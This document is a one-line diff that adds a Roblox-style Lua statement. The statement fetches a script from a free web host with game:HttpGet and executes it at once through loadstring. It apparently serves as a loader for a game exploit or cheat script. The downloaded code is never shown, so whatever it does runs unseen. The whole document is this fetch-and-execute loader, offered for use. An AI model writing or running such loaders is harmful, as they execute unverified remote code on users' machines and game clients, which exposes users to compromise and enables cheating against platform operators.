@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://donxhub.000webhostapp.com/script.lua"))()
